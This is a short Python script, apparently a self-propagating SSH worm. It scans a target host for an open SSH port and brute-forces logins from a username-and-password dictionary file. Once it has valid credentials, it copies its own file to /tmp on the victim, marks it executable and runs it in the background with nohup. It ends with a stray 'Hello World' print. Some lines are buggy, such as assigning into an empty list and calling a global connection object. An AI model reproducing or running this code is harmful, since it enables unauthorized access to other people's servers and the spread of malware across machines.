import socket
import subprocess
from datetime import datetime
import paramiko
import sys
import inspect, os

def AttackSSH(ipAddress, dictionaryFile) :
    print ( "[+] Attacking Host : %s " %ipAddress )
    paramiko.util.log_to_file("filename.log")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for line in open(dictionaryFile, "r").readlines() :
        [username, password] = line.strip().split()
        try :
            print("[+] Trying to break in with username: %s password: %s " % (username, password))
            ssh.connect(ipAddress, username=username, password=password)
        except paramiko.AuthenticationException:
            print("[-] Failed! ...")
            continue
        print("[+] Success ... username: %s and passoword %s is VALID! " % (username, password))
        thing=[] 
        thing[0]= username
        thing[1]= password
        break

    return thing

def sshScan (remoteHost):
    ## Clear the screen
    subprocess.call('clear', shell=True)

    remoteServerIP = socket.gethostbyname(remoteHost)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((remoteServerIP, 22))
    
    if result == 0:
        ## if a socket is listening it will print out the port number
        sock.close()
        return result

def UploadFileAndExecute(sshConnection, fileName) :
    sftpClient = ssh.open_sftp()
    sftpClient.put(fileName, "/tmp/" +fileName)
    ssh.exec_command("chmod a+x /tmp/" +fileName)
    ssh.exec_command("nohup /tmp/" +fileName+ " &")


result= sshScan(sys.argv[1])
if result ==0 :
 credentials=AttackSSH(sys.argv[1], sys.argv[2])
 ssh = paramiko.SSHClient()
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 ssh.connect(sys.argv[1], username=credentials[0], password=credentials[1])
 UploadFileAndExecute(ssh,  inspect.getfile(inspect.currentframe()))   
ssh.close()


print("Hello World")
